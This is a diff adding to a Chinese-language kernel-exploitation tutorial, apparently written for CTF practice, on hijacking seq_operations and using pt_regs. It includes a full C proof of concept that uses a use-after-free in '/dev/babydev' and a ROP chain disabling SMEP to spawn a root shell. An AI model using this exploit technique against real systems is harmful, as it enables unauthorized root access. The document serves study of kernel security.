@@ -183,6 +183,8 @@ int main() {
 }
 ```
 
+这个打法要求题目的 rcS 脚本里挂载了 `pts`，如果没有挂载的话就无法打开了。
+
 ### seq_operations
 
 在用户态执行 `open("/proc/self/stat",0);` 后，内核中的调用过程如下图所示：
@@ -206,6 +208,129 @@ struct seq_operations {
 ```
 
 
-其中 `start` 和 `stop` 都是可以被劫持的，当用户态对该 `fd` 进行读操作 `read(fd,buf,size)` 时，在内核中会调用 `seq_operations->start` 函数指针；随后也会调用 `seq_operations->stop` 函数指针` 
+其中 `start` 和 `stop` 都是可以被劫持的，当用户态对该 `fd` 进行读操作 `read(fd,buf,size)` 时，在内核中会调用 `seq_operations->start` 函数指针；随后也会调用 `seq_operations->stop` 函数指针，不过比较遗憾的是，这两个函数指针都无法控制参数，所以需要配合 `pt_regs` 结构体使用。
+
+> `pt_regs` 结构体：用户态的寄存器在进入内核态的时候会保留在栈底（srop的原理），因此若我们进入内核态前提前控制了这些寄存器的值，那么便可以在内核栈底留下一些可控数据。
+
+原先我们触发函数指针的方法是 `read(fd, buf, size)`，只需要用汇编语言实现如下就可以了：
+
+```c
+    asm volatile (
+        ".intel_syntax noprefix;"
+        "mov r15, 0x11111111;"
+        "mov r14, 0x22222222;"
+        "mov r13, 0x33333333;"
+        "mov r12, 0x44444444;"
+        "mov rbp, 0x55555555;"
+        "mov rbx, 0x66666666;"
+        "mov r11, 0x77777777;"
+        "mov r10, 0x88888888;"
+        "mov r9,  0x99999999;"
+        "mov r8,  0xaaaaaaaa;"
+        "xor rax, rax;"
+        "mov rcx, 0xbbbbbbbb;"
+        "mov rdx, 8;"
+        "mov rsi, rsp;"
+        "mov rdi, fd_stat;"        // 通过 seq_operations->stat 来触发
+        "syscall;"
+    );
+```
+
+poc 如下
+
+```c
+#include <kernel.h>
 
 
+// hint: 使用全局变量的原因是内联汇编不能使用局部变量
+
+unsigned long mov_rsp_rax = 0xffffffff818855cf;
+unsigned long pop_rsp_ret = 0xffffffff8101ebc5;
+unsigned long pop_rax_ret = 0xffffffff8101c216;
+unsigned long mov_cr4_rax_pop_ret = 0xffffffff8100f034;
+#define swapgs_ret 0xffffffff81885588
+#define iretq 0xffffffff81884177
+#define add_rsp_0x150_ret 0xffffffff812743a5
+unsigned long pop_rdi_ret = 0xffffffff810d238d;
+
+int fd_stat;
+unsigned long *rop;
+// unsigned long mov_cr4_rax_pop_ret = mov_cr4_rax_pop_ret;
+
+int main() {
+    save_status();
+    bind_core(0);
+    unsigned long rop_chain[30] = {0};
+    int index = 0;
+    rop_chain[index++] = pop_rax_ret;
+    rop_chain[index++] = 0x6f0;
+    rop_chain[index++] = mov_cr4_rax_pop_ret;
+    rop_chain[index++] = 0;
+    rop_chain[index++] = (unsigned long)get_root;
+    rop_chain[index++] = swapgs_ret;
+    rop_chain[index++] = iretq;
+    rop_chain[index++] = (unsigned long)get_root_shell;
+    rop_chain[index++] = user_cs;
+    rop_chain[index++] = user_rflags;
+    rop_chain[index++] = user_sp;
+    rop_chain[index++] = user_ss;
+    rop = rop_chain;
+
+    int fd1 = open("/dev/babydev", 2);
+    int fd2 = open("/dev/babydev", 2);
+    ioctl(fd1, 0x10001, 0x20);
+    close(fd1);  // uaf
+
+    fd_stat = open("/proc/self/stat", 0);
+
+    unsigned long mem[4] = {0, 1, 2, 3};
+    info("mem => {0x%llx}\n", mem);
+    read(fd2, mem, 32);
+    for (int i = 0; i < 4; ++i) {
+        info("0x%llx", mem[i]);  // 不知道为什么，我这里泄漏不出来 seq_ops 的内容???
+    }
+    mem[0] = 0xffffffff815f5951;
+    write(fd2, mem, 32);
+
+    // getchar();
+
+// 26:0130│ r12 0xffff880000a17f20 ◂— 0
+// 27:0138│+0d8 0xffff880000a17f28 ◂— 0x66666666 /* 'ffff' */
+// 28:0140│+0e0 0xffff880000a17f30 ◂— 0x44444444 /* 'DDDD' */
+// 29:0148│+0e8 0xffff880000a17f38 ◂— 0x33333333 /* '3333' */
+// 2a:0150│+0f0 0xffff880000a17f40 ◂— 0x22222222 /* '""""' */
+// 2b:0158│+0f8 0xffff880000a17f48 ◂— 0x55555555 /* 'UUUU' */
+    asm volatile (
+        ".intel_syntax noprefix;"
+        "mov r15, 0x11111111;"
+        "mov r14, 0x22222222;"
+        "mov r13, mov_rsp_rax;"
+        "mov r12, rop;"
+        "mov rbp, 0x55555555;"
+        "mov rbx, pop_rax_ret;"
+        "mov r11, 0x77777777;"
+        "mov r10, 0x88888888;"
+        "mov r9,  0x99999999;" // 后半部分
+        "mov r8,  0xaaaaaaaa;"
+        "xor rax, rax;"
+        "mov rcx, 0xbbbbbbbb;"
+        "mov rdx, 8;"
+        "mov rsi, rsp;"
+        "mov rdi, fd_stat;"        // 通过 seq_operations->stat 来触发
+        "syscall;"
+    );
+
+    close(fd_stat);
+    close(fd2);
+    return 0;
+}
+```
+
+这个结构体还可以用来绕过 KPTI 保护，后面再说。
+
+
+### subprocess_info
+
+当我们在用户态执行 `socket(22, AF_INET, 0);` 时，内核调用栈如下图所示：
+
+![subprocess]()
